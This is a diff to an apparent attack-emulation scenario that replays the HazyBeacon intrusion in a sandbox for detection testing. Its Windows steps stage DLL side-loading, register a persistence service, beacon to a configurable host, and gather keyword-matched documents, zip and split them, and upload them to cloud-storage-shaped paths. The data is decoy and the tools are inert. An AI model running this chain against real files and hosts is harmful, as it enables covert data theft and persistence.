@@ -187,8 +187,31 @@ steps:
       # The Windows text is the primary above (an alias, so it cannot drift).
       # Declared explicitly because the Windows resolver only takes a
       # primary on a windows-ONLY step, and this one also runs on linux.
-      windows: *mp026-step-01-windows
+      windows: |
+        $sandbox = 'C:\ProgramData\cortexsim-mp026'
+        # Windows form of the R2a rule. Whatever is at the path goes (rmdir removes a junction,
+        # not its target), then the folder is made WITH its ACL in one call, so no other account
+        # can open it in between: SYSTEM, Administrators, this account and a marker ACE no other
+        # folder carries. The Get-Acl below refuses anything that was there first; a later step
+        # tells this folder from a planted one with the same Get-Acl.
+        if (Test-Path -LiteralPath $sandbox) { cmd.exe /c rmdir /s /q "$sandbox" }
+        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        $sd = New-Object System.Security.AccessControl.DirectorySecurity
+        $sd.SetSecurityDescriptorSddlForm("D:P(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)(A;OICI;FA;;;$me)(A;;0x1;;;S-1-9-4243-26)", [System.Security.AccessControl.AccessControlSections]::Access)
+        $null = [System.IO.Directory]::CreateDirectory($sandbox, $sd)
+        $acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue
+        $ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value }) } else { @() }
+        if (-not ($acl -and $acl.AreAccessRulesProtected -and (@('S-1-5-18', 'S-1-5-32-544', $me) -contains $acl.GetOwner([System.Security.Principal.SecurityIdentifier]).Value) -and ($ids -contains 'S-1-9-4243-26') -and -not ($ids | Where-Object { $_ -notin 'S-1-5-18', 'S-1-5-32-544', $me, 'S-1-9-4243-26' }))) { Write-Error "sandbox $sandbox could not be created fresh: something else is at that path"; exit 1 }
+        if (Get-ChildItem -LiteralPath $sandbox -Force) { Write-Error "sandbox $sandbox is not empty: something else is at that path"; exit 1 }
+        $asm = 'C:\ProgramData\cortexsim-mp026\assembly'
+        New-Item -ItemType Directory -Force -Path $asm | Out-Null
+        $ngen = Join-Path $env:WINDIR 'Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe'
+        Copy-Item -Path $ngen -Destination (Join-Path $asm 'mscorsvw.exe') -Force
+        Set-Content -Path (Join-Path $asm 'mscorsvc.dll') -Value 'cortexsim-mp026 inert side-load stand-in, not a PE' -Encoding ASCII
+        Get-FileHash -Algorithm SHA256 -Path (Join-Path $asm 'mscorsvc.dll'), (Join-Path $asm 'mscorsvw.exe') | Format-Table -AutoSize
+        Write-Output 'report sha256 of HazyBeacon mscorsvc.dll: 4931df8650521cfd686782919bda0f376475f9fc5f1fee9d7cf3a4e0d9c73e30'
       linux: |
+        rm -rf /var/tmp/.cortexsim-mp026 && mkdir -m 700 /var/tmp/.cortexsim-mp026 || { echo "sandbox /var/tmp/.cortexsim-mp026 could not be created fresh: something else is at that path" >&2; exit 1; }
         ASM=/var/tmp/.cortexsim-mp026/assembly
         mkdir -p "$ASM"
         cp /bin/true "$ASM/mscorsvw"
@@ -219,8 +242,20 @@ steps:
       # The Windows text is the primary above (an alias, so it cannot drift).
       # Declared explicitly because the Windows resolver only takes a
       # primary on a windows-ONLY step, and this one also runs on linux.
-      windows: *mp026-step-02-windows
+      windows: |
+        $sandbox = 'C:\ProgramData\cortexsim-mp026'
+        # One Get-Acl: owned by SYSTEM, Administrators or this account, a protected DACL of only
+        # SYSTEM, Administrators, this account and this sandbox's marker. A planted folder fails on
+        # its owner, a junction on its owner or its missing marker, so swapping the two cannot pass.
+        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        $acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue
+        $ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value }) } else { @() }
+        if (-not ($acl -and $acl.AreAccessRulesProtected -and (@('S-1-5-18', 'S-1-5-32-544', $me) -contains $acl.GetOwner([System.Security.Principal.SecurityIdentifier]).Value) -and ($ids -contains 'S-1-9-4243-26') -and -not ($ids | Where-Object { $_ -notin 'S-1-5-18', 'S-1-5-32-544', $me, 'S-1-9-4243-26' }))) { Write-Error "sandbox $sandbox is missing or not ours: step-01 did not complete"; exit 1 }
+        $bin = 'C:\ProgramData\cortexsim-mp026\assembly\mscorsvw.exe'
+        if (-not (Get-Service -Name msdnetsvc -ErrorAction SilentlyContinue)) { sc.exe create msdnetsvc binPath= "$bin" start= demand DisplayName= msdnetsvc }
+        sc.exe qc msdnetsvc
       linux: |
+        [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp026 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp026 is missing or not ours: step-01 did not complete" >&2; exit 1; }
         U=/etc/systemd/system/msdnetsvc.service
         if [ -e "$U" ]; then
           echo "msdnetsvc.service pre-exists; left untouched"
@@ -264,8 +299,25 @@ steps:
       # The Windows text is the primary above (an alias, so it cannot drift).
       # Declared explicitly because the Windows resolver only takes a
       # primary on a windows-ONLY step, and this one also runs on linux.
-      windows: *mp026-step-03-windows
+      windows: |
+        $sandbox = 'C:\ProgramData\cortexsim-mp026'
+        # One Get-Acl: owned by SYSTEM, Administrators or this account, a protected DACL of only
+        # SYSTEM, Administrators, this account and this sandbox's marker. A planted folder fails on
+        # its owner, a junction on its owner or its missing marker, so swapping the two cannot pass.
+        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        $acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue
+        $ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value }) } else { @() }
+        if (-not ($acl -and $acl.AreAccessRulesProtected -and (@('S-1-5-18', 'S-1-5-32-544', $me) -contains $acl.GetOwner([System.Security.Principal.SecurityIdentifier]).Value) -and ($ids -contains 'S-1-9-4243-26') -and -not ($ids | Where-Object { $_ -notin 'S-1-5-18', 'S-1-5-32-544', $me, 'S-1-9-4243-26' }))) { Write-Error "sandbox $sandbox is missing or not ours: step-01 did not complete"; exit 1 }
+        $stage = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
+        $log = 'C:\ProgramData\cortexsim-mp026\beacon.log'
+        foreach ($i in 1..4) {
+          try { $code = (Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Uri "http://${stage}:8080/" -Method Get).StatusCode } catch { $code = 'no-listener' }
+          Add-Content -Path $log -Value "$(Get-Date -Format o) poll $i host=$env:COMPUTERNAME status=$code"
+          Start-Sleep -Seconds 3
+        }
+        Get-Content -Path $log
       linux: |
+        [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp026 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp026 is missing or not ours: step-01 did not complete" >&2; exit 1; }
         LOG=/var/tmp/.cortexsim-mp026/beacon.log
         for i in 1 2 3 4; do
           code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://${STAGE_HOST:-127.0.0.1}:8080/" || echo no-listener)
@@ -283,12 +335,13 @@ steps:
   - id: step-04
     name: "NGFW leg — recurring-comms beacon record for the run host (preset destination, un-enrichable)"
     command: |
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
       : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
       : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
       SRC_IP=${TARGET_IP:-$(hostname -I | awk '{print $1}')}
       SRC_HOST=${TARGET_HOST:-$(hostname -s)}
       SRC_USER=${TARGET_USER:-$(id -un)}
-      cat > /tmp/mp-026-beacon.yml <<YML
+      cat > "$C/mp-026-beacon.yml" <<YML
       campaign_id: CMP-MP-BEACON-026
       name: "CL-STA-1020 HazyBeacon — recurring Lambda-URL-shaped beacon (NGFW EAL)"
       authorized_by: "domain-consultant@paloaltonetworks.com"
@@ -310,7 +363,7 @@ steps:
             src_host: "$SRC_HOST"
             src_user: "$SRC_USER"
       YML
-      python3 -m scripts.eal_simulator.cli run /tmp/mp-026-beacon.yml --live
+      python3 -m scripts.eal_simulator.cli run "$C/mp-026-beacon.yml" --live
     identity: root
     mitre_technique: "T1071.001"
     causality:
@@ -327,12 +380,13 @@ steps:
   - id: step-05
     name: "NGFW leg — WildFire threat logs for the six tools pulled over the C2 (report sha256s)"
     command: |
+      C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT
       : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/threat/events}"
       : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
       SRC_IP=${TARGET_IP:-$(hostname -I | awk '{print $1}')}
       SRC_HOST=${TARGET_HOST:-$(hostname -s)}
       SRC_USER=${TARGET_USER:-$(id -un)}
-      cat > /tmp/mp-026-threat.yml <<YML
+      cat > "$C/mp-026-threat.yml" <<YML
       campaign_id: CMP-MP-THREAT-026
       name: "CL-STA-1020 HazyBeacon — WildFire verdicts on the C2-delivered toolkit"
       authorized_by: "domain-consultant@paloaltonetworks.com"
@@ -415,7 +469,7 @@ steps:
             src_host: "$SRC_HOST"
             src_user: "$SRC_USER"
       YML
-      python3 -m scripts.eal_simulator.cli run /tmp/mp-026-threat.yml --live
+      python3 -m scripts.eal_simulator.cli run "$C/mp-026-threat.yml" --live
     identity: root
     mitre_technique: "T1105"
     causality:
@@ -453,8 +507,23 @@ steps:
       # The Windows text is the primary above (an alias, so it cannot drift).
       # Declared explicitly because the Windows resolver only takes a
       # primary on a windows-ONLY step, and this one also runs on linux.
-      windows: *mp026-step-06-windows
+      windows: |
+        $sandbox = 'C:\ProgramData\cortexsim-mp026'
+        # One Get-Acl: owned by SYSTEM, Administrators or this account, a protected DACL of only
+        # SYSTEM, Administrators, this account and this sandbox's marker. A planted folder fails on
+        # its owner, a junction on its owner or its missing marker, so swapping the two cannot pass.
+        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        $acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue
+        $ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value }) } else { @() }
+        if (-not ($acl -and $acl.AreAccessRulesProtected -and (@('S-1-5-18', 'S-1-5-32-544', $me) -contains $acl.GetOwner([System.Security.Principal.SecurityIdentifier]).Value) -and ($ids -contains 'S-1-9-4243-26') -and -not ($ids | Where-Object { $_ -notin 'S-1-5-18', 'S-1-5-32-544', $me, 'S-1-9-4243-26' }))) { Write-Error "sandbox $sandbox is missing or not ours: step-01 did not complete"; exit 1 }
+        $drop = 'C:\ProgramData\cortexsim-mp026\tools'
+        New-Item -ItemType Directory -Force -Path $drop | Out-Null
+        foreach ($n in 'igfx.exe','GoogleGet.exe','google.exe','GoogleDrive.exe','GoogleDriveUpload.exe','Dropbox.exe') {
+          Set-Content -Path (Join-Path $drop $n) -Value "cortexsim-mp026 inert stand-in for $n, not a PE" -Encoding ASCII
+        }
+        Get-ChildItem -Path $drop | Select-Object Name, Length, LastWriteTime | Format-Table -AutoSize
       linux: |
+        [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp026 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp026 is missing or not ours: step-01 did not complete" >&2; exit 1; }
         DROP=/var/tmp/.cortexsim-mp026/tools
         mkdir -p "$DROP"
         for n in igfx GoogleGet google GoogleDrive GoogleDriveUpload Dropbox; do
@@ -500,8 +569,35 @@ steps:
       # The Windows text is the primary above (an alias, so it cannot drift).
       # Declared explicitly because the Windows resolver only takes a
       # primary on a windows-ONLY step, and this one also runs on linux.
-      windows: *mp026-step-07-windows
+      windows: |
+        $sandbox = 'C:\ProgramData\cortexsim-mp026'
+        # One Get-Acl: owned by SYSTEM, Administrators or this account, a protected DACL of only
+        # SYSTEM, Administrators, this account and this sandbox's marker. A planted folder fails on
+        # its owner, a junction on its owner or its missing marker, so swapping the two cannot pass.
+        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        $acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue
+        $ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value }) } else { @() }
+        if (-not ($acl -and $acl.AreAccessRulesProtected -and (@('S-1-5-18', 'S-1-5-32-544', $me) -contains $acl.GetOwner([System.Security.Principal.SecurityIdentifier]).Value) -and ($ids -contains 'S-1-9-4243-26') -and -not ($ids | Where-Object { $_ -notin 'S-1-5-18', 'S-1-5-32-544', $me, 'S-1-9-4243-26' }))) { Write-Error "sandbox $sandbox is missing or not ours: step-01 did not complete"; exit 1 }
+        $lab = 'C:\ProgramData\cortexsim-mp026'
+        $docs = Join-Path $lab 'docs'
+        $stg = Join-Path $lab 'stage'
+        New-Item -ItemType Directory -Force -Path $docs, $stg | Out-Null
+        foreach ($d in @{ 'draft-letter-on-tariff-measures.txt' = 'CORTEXSIM DECOY draft letter on tariff measures'; 'trade-dispute-briefing.txt' = 'CORTEXSIM DECOY trade dispute tariff briefing' }.GetEnumerator()) {
+          Set-Content -Path (Join-Path $docs $d.Key) -Value ($d.Value + ' ' + (-join ((1..6000) | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })))
+        }
+        Set-Content -Path (Join-Path $docs 'canteen-menu.txt') -Value 'CORTEXSIM DECOY unrelated document'
+        $since = (Get-Date).AddDays(-30)
+        $hits = Get-ChildItem -Path $docs -Recurse -File -Include *.txt, *.docx, *.pdf | Where-Object { $_.LastWriteTime -ge $since } | Select-String -Pattern 'tariff' -List
+        $zip = Join-Path $stg "$env:COMPUTERNAME.zip"
+        Compress-Archive -Path $hits.Path -DestinationPath $zip -Force
+        $sevenZip = Get-Command 7z.exe -ErrorAction SilentlyContinue
+        if ($sevenZip) { & $sevenZip.Source a -v1k "$zip.7z" $zip | Out-Null } else {
+          $bytes = [IO.File]::ReadAllBytes($zip); $n = 1
+          for ($o = 0; $o -lt $bytes.Length; $o += 1024) { $len = [Math]::Min(1024, $bytes.Length - $o); [IO.File]::WriteAllBytes(('{0}.{1:D3}' -f $zip, $n), $bytes[$o..($o + $len - 1)]); $n++ }
+        }
+        Get-ChildItem -Path $stg | Select-Object Name, Length | Format-Table -AutoSize
       linux: |
+        [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp026 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp026 is missing or not ours: step-01 did not complete" >&2; exit 1; }
         LAB=/var/tmp/.cortexsim-mp026; DOCS=$LAB/docs; STG=$LAB/stage
         mkdir -p "$DOCS" "$STG"
         printf 'CORTEXSIM DECOY draft letter on tariff measures\n' > "$DOCS/draft-letter-on-tariff-measures.txt"
@@ -543,8 +639,27 @@ steps:
       # The Windows text is the primary above (an alias, so it cannot drift).
       # Declared explicitly because the Windows resolver only takes a
       # primary on a windows-ONLY step, and this one also runs on linux.
-      windows: *mp026-step-08-windows
+      windows: |
+        $sandbox = 'C:\ProgramData\cortexsim-mp026'
+        # One Get-Acl: owned by SYSTEM, Administrators or this account, a protected DACL of only
+        # SYSTEM, Administrators, this account and this sandbox's marker. A planted folder fails on
+        # its owner, a junction on its owner or its missing marker, so swapping the two cannot pass.
+        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        $acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue
+        $ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value }) } else { @() }
+        if (-not ($acl -and $acl.AreAccessRulesProtected -and (@('S-1-5-18', 'S-1-5-32-544', $me) -contains $acl.GetOwner([System.Security.Principal.SecurityIdentifier]).Value) -and ($ids -contains 'S-1-9-4243-26') -and -not ($ids | Where-Object { $_ -notin 'S-1-5-18', 'S-1-5-32-544', $me, 'S-1-9-4243-26' }))) { Write-Error "sandbox $sandbox is missing or not ours: step-01 did not complete"; exit 1 }
+        $stage = if ($env:STAGE_HOST) { $env:STAGE_HOST } else { '127.0.0.1' }
+        $stg = 'C:\ProgramData\cortexsim-mp026\stage'
+        $log = 'C:\ProgramData\cortexsim-mp026\exfil.log'
+        foreach ($part in Get-ChildItem -Path $stg -File | Where-Object { $_.Name -match '\.(\d{3}|7z\.\d{3})$' }) {
+          foreach ($path in '/upload/drive/v3/files?uploadType=media', '/2/files/upload') {
+            try { $code = (Invoke-WebRequest -UseBasicParsing -TimeoutSec 5 -Method Post -Uri "http://${stage}:8080$path" -InFile $part.FullName -ContentType 'application/octet-stream').StatusCode } catch { $code = 'no-listener' }
+            Add-Content -Path $log -Value "$(Get-Date -Format o) $($part.Name) -> $path status=$code"
+          }
+        }
+        Get-Content -Path $log
       linux: |
+        [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp026 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp026 is missing or not ours: step-01 did not complete" >&2; exit 1; }
         STG=/var/tmp/.cortexsim-mp026/stage; LOG=/var/tmp/.cortexsim-mp026/exfil.log
         for part in "$STG"/*.tgz.[0-9][0-9][0-9]; do
           for path in '/upload/drive/v3/files?uploadType=media' '/2/files/upload'; do
@@ -583,8 +698,29 @@ steps:
       # The Windows text is the primary above (an alias, so it cannot drift).
       # Declared explicitly because the Windows resolver only takes a
       # primary on a windows-ONLY step, and this one also runs on linux.
-      windows: *mp026-step-09-windows
+      windows: |
+        $sandbox = 'C:\ProgramData\cortexsim-mp026'
+        # One Get-Acl: owned by SYSTEM, Administrators or this account, a protected DACL of only
+        # SYSTEM, Administrators, this account and this sandbox's marker. A planted folder fails on
+        # its owner, a junction on its owner or its missing marker, so swapping the two cannot pass.
+        $me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        $acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue
+        $ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object { $_.IdentityReference.Value }) } else { @() }
+        if (-not ($acl -and $acl.AreAccessRulesProtected -and (@('S-1-5-18', 'S-1-5-32-544', $me) -contains $acl.GetOwner([System.Security.Principal.SecurityIdentifier]).Value) -and ($ids -contains 'S-1-9-4243-26') -and -not ($ids | Where-Object { $_ -notin 'S-1-5-18', 'S-1-5-32-544', $me, 'S-1-9-4243-26' }))) { Write-Error "sandbox $sandbox is missing or not ours: step-01 did not complete"; exit 1 }
+        $lab = 'C:\ProgramData\cortexsim-mp026'
+        Get-ChildItem -Path (Join-Path $lab 'stage'), (Join-Path $lab 'tools') -File -ErrorAction SilentlyContinue | Remove-Item -Force
+        Get-ChildItem -Path $lab -Recurse -File | Select-Object FullName | Format-Table -AutoSize
+        # A pull run never executes scenario cleanup, so the chain's own
+        # persistence and lab directory go here, at the end of its last Windows
+        # step. The service is deleted only when it is the one step-02 created
+        # (its binPath is under the lab directory).
+        Get-CimInstance -ClassName Win32_Service -Filter "Name='msdnetsvc'" -ErrorAction SilentlyContinue | Where-Object PathName -Like '*cortexsim-mp026*' | Invoke-CimMethod -MethodName Delete | Out-Null
+        # rmdir removes a junction itself; a recursive Remove-Item in 5.1 walks into its target.
+        if (Test-Path -LiteralPath $lab) { cmd.exe /c rmdir /s /q "$lab" }
+        $global:LASTEXITCODE = 0
+        Write-Output 'cortexsim-mp-026-windows-residue-removed'
       linux: |
+        [ "$(stat -c %F:%u:%a /var/tmp/.cortexsim-mp026 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /var/tmp/.cortexsim-mp026 is missing or not ours: step-01 did not complete" >&2; exit 1; }
         LAB=/var/tmp/.cortexsim-mp026
         find "$LAB/stage" "$LAB/tools" -type f -delete
         find "$LAB" -type f
@@ -603,7 +739,7 @@ steps:
 cleanup:
   commands:
     - "if grep -qs cortexsim-mp026 /etc/systemd/system/msdnetsvc.service; then rm -f /etc/systemd/system/msdnetsvc.service; command -v systemctl >/dev/null 2>&1 && systemctl daemon-reload; fi; true"
-    - "rm -f /tmp/mp-026-beacon.yml /tmp/mp-026-threat.yml && rm -rf /var/tmp/.cortexsim-mp026"
+    - "rm -rf /var/tmp/.cortexsim-mp026"
     # Native Windows teardown (CONT-11). The previous form wrapped pwsh in bash
     # (`command -v pwsh && pwsh -Command ...`), which the Windows bundle skips,
     # so Windows never ran it. These lines are PowerShell the Windows bundle
@@ -612,7 +748,7 @@ cleanup:
     # target and names it in a `# skipped (Windows-only)` comment. The service
     # is deleted only when its binPath is the lab copy step-02 registered.
     - "Get-CimInstance -ClassName Win32_Service -Filter \"Name='msdnetsvc'\" -ErrorAction SilentlyContinue | Where-Object PathName -Like '*cortexsim-mp026*' | Invoke-CimMethod -MethodName Delete"
-    - "Remove-Item -Recurse -Force -ErrorAction SilentlyContinue -Path 'C:\\ProgramData\\cortexsim-mp026'"
+    - "cmd.exe /c if exist \"C:\\ProgramData\\cortexsim-mp026\" rd /s /q \"C:\\ProgramData\\cortexsim-mp026\""
 
 author: "Henry Reed"
 created: "2026-10-27"
